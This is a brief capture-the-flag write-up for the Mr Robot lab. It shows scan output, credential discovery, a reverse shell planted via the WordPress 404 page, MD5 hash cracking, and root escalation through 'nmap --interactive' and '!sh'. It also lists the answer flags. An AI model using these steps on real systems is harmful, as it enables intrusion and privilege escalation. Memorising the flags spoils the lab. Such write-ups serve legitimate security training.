# Mr Robot CTF

## Notes

```
PORT    STATE  SERVICE  VERSION                                                                          │
80/tcp  closed http                                                                                      │
443/tcp open   ssl/http Apache httpd                                                                     │
|_http-server-header: Apache                                                                             │
|_http-title: 400 Bad Request                                                                            │
| ssl-cert: Subject: commonName=www.example.com                                                          │
| Not valid before: 2015-09-16T10:45:03                                                                  │
|_Not valid after:  2025-09-13T10:45:03

/license    => has password?

dirsearch using fsociety.dic

[15:46:06] 301 -  236B  - /images  ->  http://10.10.232.238/images/                                      │
[15:46:13] 301 -  233B  - /css  ->  http://10.10.232.238/css/                                            │
[15:46:28] 301 -    0B  - /image  ->  http://10.10.232.238/image/                                        │
[15:48:41] 200 -  309B  - /license          => HAS wp login creds
[15:48:51] 301 -    0B  - /feed  ->  http://10.10.232.238/feed/                                          │
[15:48:53] 301 -  235B  - /video  ->  http://10.10.232.238/video/                                        │
[15:49:11] 301 -  235B  - /audio  ->  http://10.10.232.238/audio/                                        │
[15:57:53] 301 -  235B  - /admin  ->  http://10.10.232.238/admin/                                        │
[15:58:58] 301 -  234B  - /blog  ->  http://10.10.232.238/blog/                                          │
[16:07:15] 301 -    0B  - /Image  ->  http://10.10.232.238/Image/                                        │
[16:23:57] 200 -  504KB - /intro                                                                         │
[16:44:55] 301 -    0B  - /rss  ->  http://10.10.232.238/feed/                                           │
[16:46:13] 302 -    0B  - /login  ->  http://10.10.232.238/wp-login.php                                  │
[16:46:47] 200 -   64B  - /readme                                                                        │
[17:08:15] 403 -  657B  - /Year20112010200920082007200620052004200320022001200019991998199719961995199419│
931992199119901989198819871986198519841983198219811980197919781977197619751974197319721971197019691968196│
719661965196419631962196119601959195819571956195519541953195219511950194919481947194619451944194319421941│
194019391938193719361935193419331932193119301929192819271926192519241923192219211920191919181917191619151│
9141913191219111910190919081907190619051904190319021901

credentials for wp login can be found inside /license
need to upload shell by editing 404 page and modifying it with reverseshell
```

## Questions

1. What is key 1?

```
robots.txt gives location to first key file

073403c8a58a1f80d943455fb30724b9
```

2. What is key 2?

```
login using creds found in /license
edit 404 page and insert rev shell
once you have shell the second flag is inside /home/robot
but current user(daemon) doesn't have read access
there's another file password.raw-md5 which everyone has read access to
    robot:c3fcd3d76192e4007dfb496cca67e13b
    robot:abcdefghijklmnopqrstuvwxyz    (search result for hash)
access using robot's creds and read file

822c73956184f694993bede3eb39f959

```

3. What is key 3?

```
search list of all setuid binaries
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

nmap can be used to escalate privilege

nmap --interactive
!sh

after becoming root the last flag is inside /root/

04787ddef27c3dee1ee161b21670b4e4
```
